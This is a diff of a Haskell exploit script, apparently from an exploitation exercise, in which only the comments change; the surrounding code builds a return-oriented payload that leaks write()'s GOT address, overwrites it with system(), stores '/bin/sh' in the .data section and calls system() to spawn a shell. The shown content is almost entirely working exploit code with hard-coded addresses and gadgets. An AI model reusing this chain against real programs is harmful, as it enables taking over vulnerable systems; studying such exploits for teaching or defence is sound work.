@@ -89,28 +89,30 @@ systemOffset = 0x0009d990
 
 paddedExploit :: ByteString
 paddedExploit = nops
-    <> encode writeAddrPLT          -- print out address of write() to stdout.
+    <> encode writeAddrPLT          -- Print out address of write() to stdout.
         <> encode popPopPopRetAddr
         <> encode (toAddr 1)
         <> encode writeAddressGOT
         <> encode (toAddr 4)
-    <> encode readAddrPLT           -- read in computed location of system()
+    <> encode readAddrPLT           -- Read in computed location of system()
                                     -- into write()'s GOT.
         <> encode popPopPopRetAddr
         <> encode (toAddr 0)
         <> encode writeAddressGOT
         <> encode (toAddr 4)
-    <> encode readAddrPLT           -- read in 8 character string to feed to
-                                    -- system().
+    <> encode readAddrPLT           -- Read in 8 character string to feed to
+                                    -- system().  This will be something
+                                    -- like "/bin/sh".
         <> encode popPopPopRetAddr
         <> encode (toAddr 0)
-        <> encode (toAddr 0x8049620) -- this is the .data section.
-                                     -- we could also use the .bss
+        <> encode (toAddr 0x8049620) -- This is the .data section.
+                                     -- We could also use the .bss
                                      -- at 0x08049628.
         <> encode (toAddr 8)
-    <> encode writeAddrPLT -- this should be pointing to system()
+    <> encode writeAddrPLT           -- This should be pointing to system().
         <> BL.replicate 4 nop
-        <> encode (toAddr 0x8049620) -- TODO: what should these args be?
+        <> encode (toAddr 0x8049620) -- Send system() the addr that we stored
+                                     -- the "/bin/sh" string in.
 
 main :: IO ()
 main = do
